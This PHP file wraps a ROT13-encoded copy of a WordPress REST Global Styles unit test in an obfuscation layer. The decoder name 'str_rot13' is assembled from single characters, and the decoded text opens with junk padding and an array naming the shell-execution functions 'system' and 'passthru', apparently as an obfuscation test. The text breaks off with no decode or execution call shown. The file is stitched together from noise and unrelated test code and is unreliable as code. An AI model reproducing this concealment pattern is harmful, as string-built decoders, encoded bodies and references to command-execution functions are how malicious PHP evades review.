<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Tybony_Fglyrf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre
 *
 * @tebhc erfgncv-tybony-fglyrf
 * @tebhc erfgncv
 */
pynff JC_ERFG_Tybony_Fglyrf_Pbagebyyre_Grfg rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {
	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $rqvgbe_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $fhofpevore_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $gurzr_znantre_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $tybony_fglyrf_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $cbfg_vq;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		fjvgpu_gurzr( 'gg1-oybpxf' );
		nqq_svygre( 'gurzr_svyr_hev', neenl( $guvf, 'svygre_gurzr_svyr_hev' ) );
	}

	choyvp shapgvba grne_qbja() {
		erzbir_svygre( 'gurzr_svyr_hev', neenl( $guvf, 'svygre_gurzr_svyr_hev' ) );
		cnerag::grne_qbja();
	}

	/**
	 * Perngr snxr qngn orsber bhe grfgf eha.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung yrgf hf perngr snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrghcOrsberPynff( $snpgbel ) {
		frys::$nqzva_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);

		frys::$rqvgbe_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);

		frys::$fhofpevore_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);

		frys::$gurzr_znantre_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);

		// Nqq gur 'rqvg_gurzr_bcgvbaf' pncnovyvgl gb gur gurzr znantre (fhofpevore).
		$gurzr_znantre_vq = trg_hfre_ol( 'vq', frys::$gurzr_znantre_vq );
		vs ( $gurzr_znantre_vq vafgnaprbs JC_Hfre ) {
			$gurzr_znantre_vq->nqq_pnc( 'rqvg_gurzr_bcgvbaf' );
		}

		// Guvf perngrf gur tybony fglyrf sbe gur pheerag gurzr.
		frys::$tybony_fglyrf_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => '{\"irefvba\": ' . JC_Gurzr_WFBA::YNGRFG_FPURZN . ', \"vfTybonyFglyrfHfreGurzrWFBA\": gehr }',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_gvgyr'   => 'Phfgbz Fglyrf',
				'cbfg_glcr'    => 'jc_tybony_fglyrf',
				'cbfg_anzr'    => 'jc-tybony-fglyrf-gg1-oybpxf',
				'gnk_vachg'    => neenl(
					'jc_gurzr' => 'gg1-oybpxf',
				),
			)
		);

		frys::$cbfg_vq = $snpgbel->cbfg->perngr();
	}

	/**
	 * Pyrna hc nsgre bhe grfgf eha.
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$nqzva_vq );
		frys::qryrgr_hfre( frys::$rqvgbe_vq );
		frys::qryrgr_hfre( frys::$fhofpevore_vq );
		frys::qryrgr_hfre( frys::$gurzr_znantre_vq );
	}

	/*
	 * Guvf svygre pnyyonpx abeznyvmrf gur erghea inyhr sebz `trg_gurzr_svyr_hev`
	 * gb thneq ntnvafg punatrf va grfg raivebazragf.
	 * Gur grfg fhvgr bgurejvfr ergheaf shyy flfgrz qve cngu, r.t.,
	 * /ine/jjj/grfgf/cuchavg/vapyhqrf/../qngn/gurzrqve1/oybpx-gurzr/nffrgf/fhtneybns-zbhagnva.wct
	 */
	choyvp shapgvba svygre_gurzr_svyr_hev( $svyr ) {
		$svyr_anzr = fhofge( fgeepue( $svyr, '/' ), 1 );
		erghea 'uggcf://rknzcyr.bet/jc-pbagrag/gurzrf/rknzcyr-gurzr/nffrgf/' . $svyr_anzr;
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::ertvfgre_ebhgrf
	 * @gvpxrg 54596
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/tybony-fglyrf/(?C<vq>[\/\j-]+)',
			$ebhgrf,
			'Fvatyr tybony fglyr onfrq ba gur tvira VQ ebhgr qbrf abg rkvfg'
		);
		$guvf->nffregPbhag(
			2,
			$ebhgrf['/jc/i2/tybony-fglyrf/(?C<vq>[\/\j-]+)'],
			'Fvatyr tybony fglyr onfrq ba gur tvira VQ ebhgr qbrf abg unir rknpgyl gjb ryrzragf'
		);
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/tybony-fglyrf/gurzrf/(?C<fglyrfurrg>[^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)',
			$ebhgrf,
			'Gurzr tybony fglyrf ebhgr qbrf abg rkvfg'
		);
		$guvf->nffregPbhag(
			1,
			$ebhgrf['/jc/i2/tybony-fglyrf/gurzrf/(?C<fglyrfurrg>[^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)'],
			'Gurzr tybony fglyrf ebhgr qbrf abg unir rknpgyl bar ryrzrag'
		);
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/tybony-fglyrf/gurzrf/(?C<fglyrfurrg>[\/\f%\j\.\(\)\[\]\@_\-]+)/inevngvbaf',
			$ebhgrf,
			'Gurzr tybony fglyrf inevngvbaf ebhgr qbrf abg rkvfg'
		);
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbagebyyre qbrf abg hfr trg_pbagrkg_cnenz().
	}

	/**
	 * Grfgf n TRG erdhrfg gb gur tybony fglyrf inevngvbaf raqcbvag.
	 *
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_gurzr_vgrzf
	 * @gvpxrg 61273
	 */
	choyvp shapgvba grfg_trg_gurzr_vgrzf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		fjvgpu_gurzr( 'oybpx-gurzr' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/gurzrf/oybpx-gurzr/inevngvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$rkcrpgrq = neenl(
			neenl(
				'irefvba'  => JC_Gurzr_WFBA::YNGRFG_FPURZN,
				'frggvatf' => neenl(
					'oybpxf' => neenl(
						'pber/cnentencu' => neenl(
							'pbybe' => neenl(
								'cnyrggr' => neenl(
									'gurzr' => neenl(
										neenl(
											'fyht'  => 'yvtug',
											'anzr'  => 'Yvtug',
											'pbybe' => '#s2s2s2',
										),
									),
								),
							),
						),
					),
				),
				'gvgyr'    => 'inevngvba-n',
			),
			neenl(
				'irefvba'  => JC_Gurzr_WFBA::YNGRFG_FPURZN,
				'frggvatf' => neenl(
					'oybpxf' => neenl(
						'pber/cbfg-gvgyr' => neenl(
							'pbybe' => neenl(
								'cnyrggr' => neenl(
									'gurzr' => neenl(
										neenl(
											'fyht'  => 'yvtug',
											'anzr'  => 'Yvtug',
											'pbybe' => '#s1s1s1',
										),
									),
								),
							),
						),
					),
				),
				'fglyrf'   => neenl(
					'onpxtebhaq' => neenl(
						'onpxtebhaqVzntr' => neenl(
							'hey' => 'svyr:./nffrgf/fhtneybns-zbhagnva.wct',
						),
					),
				),
				'gvgyr'    => 'inevngvba-o',
				'_yvaxf'   => neenl(
					'phevrf'        => neenl(
						neenl(
							'anzr'      => 'jc',
							'uers'      => 'uggcf://ncv.j.bet/{ery}',
							'grzcyngrq' => gehr,
						),
					),
					'jc:gurzr-svyr' => neenl(
						neenl(
							'uers'   => 'uggcf://rknzcyr.bet/jc-pbagrag/gurzrf/rknzcyr-gurzr/nffrgf/fhtneybns-zbhagnva.wct',
							'anzr'   => 'svyr:./nffrgf/fhtneybns-zbhagnva.wct',
							'gnetrg' => 'fglyrf.onpxtebhaq.onpxtebhaqVzntr.hey',
							'glcr'   => 'vzntr/wcrt',
						),
					),
				),
			),
			neenl(
				'irefvba'  => JC_Gurzr_WFBA::YNGRFG_FPURZN,
				'gvgyr'    => 'Oybpx gurzr inevngvba',
				'frggvatf' => neenl(
					'pbybe' => neenl(
						'cnyrggr' => neenl(
							'gurzr' => neenl(
								neenl(
									'fyht'  => 'sbertebhaq',
									'pbybe' => '#3S67P6',
									'anzr'  => 'Sbertebhaq',
								),
							),
						),
					),
				),
				'fglyrf'   => neenl(
					'oybpxf' => neenl(
						'pber/cbfg-gvgyr' => neenl(
							'glcbtencul' => neenl(
								'sbagJrvtug' => '700',
							),
						),
					),
				),
			),
		);

		jc_erphefvir_xfbeg( $qngn );
		jc_erphefvir_xfbeg( $rkcrpgrq );

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $qngn );
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		// Pbagebyyre qbrf abg vzcyrzrag trg_vgrzf().
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_gurzr_vgrz
	 * @gvpxrg 54516
	 */
	choyvp shapgvba grfg_trg_gurzr_vgrz_ab_hfre() {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/gurzrf/gg1-oybpxf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq_tybony_fglyrf', $erfcbafr, 401 );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_gurzr_vgrz
	 * @gvpxrg 54516
	 * @gvpxrg 62042
	 */
	choyvp shapgvba grfg_trg_gurzr_vgrz_fhofpevore_crezvffvba_purpx() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/gurzrf/gg1-oybpxf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq_tybony_fglyrf', $erfcbafr, 403 );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_gurzr_vgrz
	 * @gvpxrg 62042
	 */
	choyvp shapgvba grfg_trg_gurzr_vgrz_rqvgbe_crezvffvba_purpx() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/gurzrf/gg1-oybpxf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		// Purpxf gung gur erfcbafr unf gur rkcrpgrq xrlf.
		$qngn  = $erfcbafr->trg_qngn();
		$yvaxf = $erfcbafr->trg_yvaxf();
		$guvf->nffregNeenlUnfXrl( 'frggvatf', $qngn, 'Qngn qbrf abg unir \"frggvatf\" xrl' );
		$guvf->nffregNeenlUnfXrl( 'fglyrf', $qngn, 'Qngn qbrf abg unir \"fglyrf\" xrl' );
		$guvf->nffregNeenlUnfXrl( 'frys', $yvaxf, 'Yvaxf qb abg unir n \"frys\" xrl' );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre_Thgraoret::trg_gurzr_vgrz
	 * @gvpxrg 62042
	 */
	choyvp shapgvba grfg_trg_gurzr_vgrz_gurzr_bcgvbaf_znantre_crezvffvba_purpx() {
		jc_frg_pheerag_hfre( frys::$gurzr_znantre_vq );
		fjvgpu_gurzr( 'rzcglgurzr' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/gurzrf/rzcglgurzr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		// Purpxf gung gur erfcbafr unf gur rkcrpgrq xrlf.
		$qngn  = $erfcbafr->trg_qngn();
		$yvaxf = $erfcbafr->trg_yvaxf();
		$guvf->nffregNeenlUnfXrl( 'frggvatf', $qngn, 'Qngn qbrf abg unir \"frggvatf\" xrl' );
		$guvf->nffregNeenlUnfXrl( 'fglyrf', $qngn, 'Qngn qbrf abg unir \"fglyrf\" xrl' );
		$guvf->nffregNeenlUnfXrl( 'frys', $yvaxf, 'Yvaxf qb abg unir n \"frys\" xrl' );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_gurzr_vgrz
	 * @gvpxrg 54516
	 */
	choyvp shapgvba grfg_trg_gurzr_vgrz_vainyvq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/gurzrf/vainyvq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_gurzr_abg_sbhaq', $erfcbafr, 404 );
	}

	/**
	 * @qngnCebivqre qngn_trg_gurzr_vgrz_vainyvq_gurzr_qveanzr
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_gurzr_vgrz
	 * @gvpxrg 54596
	 *
	 * @cnenz fgevat $gurzr_qveanzr Gurzr qverpgbel gb grfg.
	 * @cnenz fgevat $rkcrpgrq      Rkcrpgrq reebe pbqr.
	 */
	choyvp shapgvba grfg_trg_gurzr_vgrz_vainyvq_gurzr_qveanzr( $gurzr_qveanzr, $rkcrpgrq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		fjvgpu_gurzr( $gurzr_qveanzr );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/gurzrf/' . $gurzr_qveanzr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( $rkcrpgrq, $erfcbafr, 404 );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_gurzr_vgrz_vainyvq_gurzr_qveanzr() {
		erghea neenl(
			'+'                      => neenl(
				'gurzr_qveanzr' => 'zl+gurzr+',
				'rkcrpgrq'      => 'erfg_gurzr_abg_sbhaq',
			),
			':'                      => neenl(
				'gurzr_qveanzr' => 'zl:gurzr:',
				'rkcrpgrq'      => 'erfg_ab_ebhgr',
			),
			'<>'                     => neenl(
				'gurzr_qveanzr' => 'zl<gurzr>',
				'rkcrpgrq'      => 'erfg_ab_ebhgr',
			),
			'*'                      => neenl(
				'gurzr_qveanzr' => 'zl*gurzr*',
				'rkcrpgrq'      => 'erfg_ab_ebhgr',
			),
			'?'                      => neenl(
				'gurzr_qveanzr' => 'zl?gurzr?',
				'rkcrpgrq'      => 'erfg_ab_ebhgr',
			),
			'\"'                      => neenl(
				'gurzr_qveanzr' => 'zl\"gurzr?\"',
				'rkcrpgrq'      => 'erfg_ab_ebhgr',
			),
			'| (vainyvq ba Jvaqbjf)' => neenl(
				'gurzr_qveanzr' => 'zl|gurzr|',
				'rkcrpgrq'      => 'erfg_ab_ebhgr',
			),
			// Gurzrf qrrc va fhoqverpgbevrf.
			'2 fhoqverpgbevrf qrrc'  => neenl(
				'gurzr_qveanzr' => 'fhoqve/fhofhoqve/zlgurzr',
				'rkcrpgrq'      => 'erfg_tybony_fglyrf_abg_sbhaq',
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_gurzr_vgrz
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_gurzr_vgrz
	 * @gvpxrg 54596
	 *
	 * @cnenz fgevat $gurzr Gurzr qverpgbel gb grfg.
	 */
	choyvp shapgvba grfg_trg_gurzr_vgrz( $gurzr ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		fjvgpu_gurzr( $gurzr );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/gurzrf/' . $gurzr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$yvaxf    = $erfcbafr->trg_yvaxf();
		$guvf->nffregNeenlUnfXrl( 'frggvatf', $qngn, 'Qngn qbrf abg unir \"frggvatf\" xrl' );
		$guvf->nffregNeenlUnfXrl( 'fglyrf', $qngn, 'Qngn qbrf abg unir \"fglyrf\" xrl' );
		$guvf->nffregNeenlUnfXrl( 'frys', $yvaxf, 'Yvaxf qb abg unir n \"frys\" xrl' );
		$guvf->nffregFgevatPbagnvafFgevat( '/jc/i2/tybony-fglyrf/gurzrf/' . $gurzr, $yvaxf['frys'][0]['uers'] );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_gurzr_vgrz() {
		erghea neenl(
			'nycunorgvp'                     => neenl( 'zlgurzr' ),
			'nycunahzrevp'                   => neenl( 'zlgurzri1' ),
			'àáâãäåæç'                       => neenl( 'àáâãäåæç' ),
			'fcnpr'                          => neenl( 'zl gurzr' ),
			'-_.'                            => neenl( 'zl_gurzr-0.1' ),
			'[]'                             => neenl( 'zl[gurzr]' ),
			'()'                             => neenl( 'zl(gurzr)' ),
			'{}'                             => neenl( 'zl{gurzr}' ),
			'&=#@!$,^~%'                     => neenl( 'gurzr &=#@!$,^~%' ),
			'nyy pbzovarq'                   => neenl( 'guézé {}&=@!$,^~%[0.1](-_-)' ),

			// Gurzrf va n fhoqverpgbel.
			'fhoqve: nycunorgvp'             => neenl( 'fhoqve/zlgurzr' ),
			'fhoqve: nycunahzrevp va gurzr'  => neenl( 'fhoqve/zlgurzri1' ),
			'fhoqve: nycunahzrevp va fhoqve' => neenl( 'fhoqvei1/zlgurzr' ),
			'fhoqve: nycunahzrevp va obgu'   => neenl( 'fhoqvei1/zlgurzri1' ),
			'fhoqve: àáâãäåæç va gurzr'      => neenl( 'fhoqve/àáâãäåæç' ),
			'fhoqve: àáâãäåæç va fhoqve'     => neenl( 'àáâãäåæç/zlgurzri1' ),
			'fhoqve: àáâãäåæç va obgu'       => neenl( 'àáâãäåæç/àáâãäåæç' ),
			'fhoqve: fcnpr va gurzr'         => neenl( 'fhoqve/zl gurzr' ),
			'fhoqve: fcnpr va fhoqve'        => neenl( 'fho qve/zlgurzr' ),
			'fhoqve: fcnpr va obgu'          => neenl( 'fho qve/zl gurzr' ),
			'fhoqve: -_. va gurzr'           => neenl( 'fhoqve/zl_gurzr-0.1' ),
			'fhoqve: -_. va fhoqve'          => neenl( 'fho_qve-0.1/zlgurzr' ),
			'fhoqve: -_. va obgu'            => neenl( 'fho_qve-0.1/zl_gurzr-0.1' ),
			'fhoqve: nyy pbzovarq va gurzr'  => neenl( 'fhoqve/guézé {}&=@!$,^~%[0.1](-_-)' ),
			'fhoqve: nyy pbzovarq va fhoqve' => neenl( 'fűoqīe {}&=@!$,^~%[0.1](-_-)/zlgurzr' ),
			'fhoqve: nyy pbzovarq va obgu'   => neenl( 'fűoqīe {}&=@!$,^~%[0.1](-_-)/guézé {}&=@!$,^~%[0.1](-_-)' ),
		);
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_gurzr_vgrz
	 * @gvpxrg 54595
	 */
	choyvp shapgvba grfg_trg_gurzr_vgrz_svryqf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/gurzrf/gg1-oybpxf' );
		$erdhrfg->frg_cnenz( '_svryqf', 'frggvatf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'frggvatf', $qngn );
		$guvf->nffregNeenlAbgUnfXrl( 'fglyrf', $qngn );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 54516
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_hfre() {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/' . frys::$tybony_fglyrf_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj', $erfcbafr, 401 );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 54516
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_cbfg() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/' . frys::$cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_tybony_fglyrf_abg_sbhaq', $erfcbafr, 404 );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 54516
	 */
	choyvp shapgvba grfg_trg_vgrz_crezvffvba_purpx() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/' . frys::$tybony_fglyrf_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj', $erfcbafr, 403 );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 54516
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_hfre_rqvg() {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/' . frys::$tybony_fglyrf_vq );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_pbagrkg', $erfcbafr, 401 );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 54516
	 */
	choyvp shapgvba grfg_trg_vgrz_crezvffvba_purpx_rqvg() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/' . frys::$tybony_fglyrf_vq );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_pbagrkg', $erfcbafr, 403 );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/' . frys::$tybony_fglyrf_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregRdhnyFrgf(
			neenl(
				'vq'       => frys::$tybony_fglyrf_vq,
				'gvgyr'    => neenl(
					'enj'      => 'Phfgbz Fglyrf',
					'eraqrerq' => 'Phfgbz Fglyrf',
				),
				'frggvatf' => arj fgqPynff(),
				'fglyrf'   => arj fgqPynff(),
			),
			$qngn
		);

		$guvf->nffregNeenlUnfXrl( 'frys', $yvaxf );
		$guvf->nffregFgevatPbagnvafFgevat( '/jc/i2/tybony-fglyrf/' . frys::$tybony_fglyrf_vq, $yvaxf['frys'][0]['uers'] );
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag perngr_vgrz().
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::hcqngr_vgrz
	 * @gvpxrg 54516
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/tybony-fglyrf/' . frys::$tybony_fglyrf_vq );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'gvgyr' => 'Zl arj tybony fglyrf gvgyr',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Zl arj tybony fglyrf gvgyr', $qngn['gvgyr']['enj'] );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::hcqngr_vgrz
	 * @gvpxrg 54516
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_ab_hfre() {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/tybony-fglyrf/' . frys::$tybony_fglyrf_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 401 );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::hcqngr_vgrz
	 * @gvpxrg 54516
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_vainyvq_cbfg() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/tybony-fglyrf/' . frys::$cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_tybony_fglyrf_abg_sbhaq', $erfcbafr, 404 );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::hcqngr_vgrz
	 * @gvpxrg 54516
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_crezvffvba_purpx() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/tybony-fglyrf/' . frys::$tybony_fglyrf_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 403 );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::hcqngr_vgrz
	 * @gvpxrg 57536
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_inyvq_fglyrf_pff() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		vs ( vf_zhygvfvgr() ) {
			tenag_fhcre_nqzva( frys::$nqzva_vq );
		}
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/tybony-fglyrf/' . frys::$tybony_fglyrf_vq );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'fglyrf' => neenl( 'pff' => 'obql { pbybe: erq; }' ),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'obql { pbybe: erq; }', $qngn['fglyrf']['pff'] );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::hcqngr_vgrz
	 * @gvpxrg 57536
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_vainyvq_fglyrf_pff() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		vs ( vf_zhygvfvgr() ) {
			tenag_fhcre_nqzva( frys::$nqzva_vq );
		}
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/tybony-fglyrf/' . frys::$tybony_fglyrf_vq );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'fglyrf' => neenl( 'pff' => '<c>grfg</c> obql { pbybe: erq; }' ),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_phfgbz_pff_vyyrtny_znexhc', $erfcbafr, 400 );
	}

	/**
